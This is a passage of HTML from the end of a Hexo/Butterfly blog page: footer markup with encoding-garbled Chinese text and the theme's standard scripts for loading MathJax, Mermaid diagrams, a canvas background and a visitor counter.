class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By æ‘˜æ˜Ÿçš„è¾‰</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div><div class="footer_custom_text"><div style="text-align:center; margin-top:20px;">
  <div style="margin-top:10px;">
    ä»Šå¤©ä¹Ÿè¦ç»§ç»­åŠ æ²¹å“¦ï¼
  </div>
</div>
</div></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptions'));
  mermaid.initialize(options);
}</script></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script id="canvas_nest" defer="defer" color="100,149,237" opacity="0.6" zIndex="-1" count="70" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>